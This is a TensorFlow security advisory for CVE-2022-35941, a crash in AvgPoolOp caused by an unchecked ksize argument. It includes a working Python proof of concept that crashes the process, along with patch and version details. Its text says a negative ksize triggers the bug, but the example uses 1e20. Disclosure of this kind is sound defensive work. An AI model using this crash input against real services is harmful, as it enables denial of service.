<h2>TFSA-2022-091: <code>CHECK</code> failure in <code>AvgPoolOp</code></h2>
<h3>CVE Number</h3>
<p>CVE-2022-35941</p>
<h3>Impact</h3>
<p>The <a href="https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/avgpooling_op.cc#L56-L98"><code>AvgPoolOp</code></a> function takes an argument <code>ksize</code> that must be positive but is not checked. A negative <code>ksize</code> can trigger a <code>CHECK</code> failure and crash the program.
```python
import tensorflow as tf
import numpy as np</p>
<p>value = np.ones([1, 1, 1, 1])
ksize = [1, 1e20, 1, 1]
strides = [1, 1, 1, 1]
padding = 'SAME'
data_format = 'NHWC'</p>
<p>tf.raw_ops.AvgPool(value=value, ksize=ksize, strides=strides, padding=padding, data_format=data_format)
```</p>
<h3>Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/3a6ac52664c6c095aa2b114e742b0aa17fdce78f">3a6ac52664c6c095aa2b114e742b0aa17fdce78f</a>.</p>
<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
